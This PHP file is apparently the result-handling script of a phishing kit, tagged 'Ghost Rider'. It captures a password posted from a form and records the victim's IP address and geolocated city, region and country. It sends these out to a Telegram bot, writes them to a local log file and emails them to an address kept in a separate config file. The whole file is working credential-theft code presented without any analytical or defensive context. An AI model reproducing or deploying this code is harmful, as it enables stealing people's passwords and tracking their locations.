<?php
	
	$data = $_POST['pass'];
	require_once('Yourmail.php');
	require_once('geoplugin.class.php');
	$geoplugin = new geoPlugin();

    //get user's ip address 
    $geoplugin->locate();
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
    } else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
    }
	if($data != null){

    $message = "";
    $message .= "---|Ghost Rider|---\n";
    $message .= " $data \n";
    $message .= "--------------------------\n";
    $message .= "IP : " .$ip. "\n";
    $message .= "City: {$geoplugin->city}\n";
    $message .= "Region: {$geoplugin->region}\n";
    $message .= "Country Name: {$geoplugin->countryName}\n";
    $message .= "Country Code: {$geoplugin->countryCode}\n";
    $message .= "--------------------------\n";
	
	file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );
	$handle = fopen("JOB.txt", "a");
	fwrite($handle, $message);
	fclose($handle);

	$subject = "data l $ip";
	$headers = "From: Result@cok.com";

	{
	mail("$send",$subject,$message);
	}
	}
?>

